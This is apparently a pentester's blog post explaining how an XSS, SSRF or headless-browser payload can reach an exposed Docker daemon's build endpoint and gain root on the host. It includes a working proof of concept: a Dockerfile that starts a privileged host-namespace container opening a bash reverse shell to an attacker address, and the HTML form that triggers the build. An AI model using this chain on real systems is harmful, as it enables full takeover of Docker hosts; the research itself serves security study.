---
title: Exploiting the Docker daemon from an XSS perspective
date: '2025-01-02T00:00:00+01:00'
description: >-
  While reporting exposed docker daemons during an internal pentest, a colleague
  came up with a weird idea : is it possible to hit the Docker API from an XSS ?
---

# 

### Finding the right API endpoint

To exploit any API endpoint from an XSS, we first need to fight CORS restrictions. Sadly for us, Docker does not return any [CORS headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).

This means we should only be able to hit the docker API using `GET` and `POST` requests sent straight from an HTML form.

Looking at the [Docker API documentation](https://docs.docker.com/reference/api/engine/version/v1.45/), pretty much all endpoints require a `Content-Type: application/json` header to be valid. In fact, the API will reject any request without this Content-Type, and it is protected against [Content-Type juggling](https://www.thehacker.recipes/web/inputs/content-type-juggling/).

While crawling through the docs, it seems that `POST /build` is the perfect candidate for our experiment.

[{% embed url="" %}](https://docs.docker.com/reference/api/engine/version/v1.45/#tag/Image/operation/ImageBuild)

The endpoint only expects _query_ parameters, which can easily be sent from an HTML form. It does not require the `application/json` Content-Type either.

The `remote` paremeter is exceptionnally interesting for our use case as well :&#x20;

> **remote** : A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file’s contents are placed into a file called `Dockerfile` and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the `dockerfile` parameter is also specified, there must be a file with the corresponding path inside the tarball.

From here, the goal is to escape the Docker build process to obtain full RCE on the docker host. [We could try to exploit vulnerable Docker versions](https://www.paloaltonetworks.com/blog/prisma-cloud/leaky-vessels-vulnerabilities-container-escape/), but this is already overkill because we already have the full daemon exposed !&#x20;

The `networkmode` parameter is perfect because it will give us full network access and more importantly a "localhost" perspective using `host` mode. This helps us hitting the Docker daemon API without having to handle the container's gateway ourselves.

> **networkmode** : Sets the networking mode for the run commands during build. Supported standard values are: `bridge`, `host`, `none`, and `container:<name|id>`. Any other value is taken as a custom network's name or ID to which this container should connect to.

### Proof-of-concept

* Docker daemon exposed on `127.0.0.1:2375`
* Docker daemon running with root privileeges (usually the default setup)

When built, the following Dockerfile will run a Docker cli against the current host at `127.0.0.1:2375` and create an escape container, given that the daemon has root privileges. The container then sends a basic reverse shell to the attacker's machine :

```docker
FROM alpine:latest
RUN apk add --update docker-cli
RUN docker -H 127.0.0.1:2375 run -i --name pwned --rm --pid=host --privileged ubuntu:latest nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash -c "bash -i >& /dev/tcp/attackerip/port 0>&1"
```

To trigger the build, we prepare a simple HTML POST form against `127.0.0.1:2375/build` and host the Dockerfile at any location that can be reached by the Docker daemon :

```html
<form method="POST" action="http://127.0.0.1:2375/build?&nocache=true&networkmode=host&remote=https://gist.githubusercontent.com/..../Pwned.Dockerfile">
  <input type="submit" value="PwnMe">
</form>
```

Submitting the form will trigger the build and give a root reeverse shell to the Docker host.

![demo](demo.gif)

### SSRF and Server-Side XSS

As you might expect, this attack can be executed in an SSRF scenario or a Server-Side XSS from Puppeteer or Selenium.

As of 01/01/2025, [SSRFMap](https://github.com/swisskyrepo/SSRFmap) does not include a Docker RCE SSRF, which makes me think that this technique is currently undocumented. Maybe in a future PR 😊

### RedTeam considerations

Docker daemons are very rarely exposed on servers, and you will probably never be able to get a "blind" XSS to run against a server.

Regarding workstations, it is not impossible, but I have never seen exposed docker daemons on end-user systems (unix or Docker Desktop). I guess it could work with a high risk / very low success rate on a mass-scale XSS. Meh.

This attack could be exploited against non-local hosts to bridge into restricted environments, but the attacker should already know the IP of an exposed docker daemon. In most cases, getting to know the IP already means you have access to the daemon.

Overall this makes the attack unpractical in a redteam scenario. This attack might only be interesting in a CTF challenge 😜